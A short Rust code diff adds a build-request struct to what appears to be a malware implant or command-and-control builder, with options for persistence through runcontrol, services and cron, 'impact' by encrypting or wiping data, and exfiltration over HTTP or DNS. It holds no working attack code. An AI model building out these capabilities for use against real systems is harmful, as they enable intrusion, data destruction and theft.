@@ -60,3 +60,26 @@ pub struct GhostConfigUpdate {
     pub sleep_interval: i64,
     pub jitter_percent: i16
 }
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct GhostBuildRequest {
+        pub target_url: String,
+        pub target_port: String,
+        pub enable_debug: bool,
+
+        // persistence
+        pub enable_persistence: bool,
+        pub persist_runcontrol: bool,
+        pub persist_service: bool,
+        pub persist_cron: bool,
+
+        // impact
+        pub enable_impact: bool,
+        pub impact_encrypt: bool,
+        pub impact_wipe: bool,
+
+        // exfiltration
+        pub enable_exfil: bool,
+        pub exfil_http: bool,
+        pub exfil_dns: bool
+}
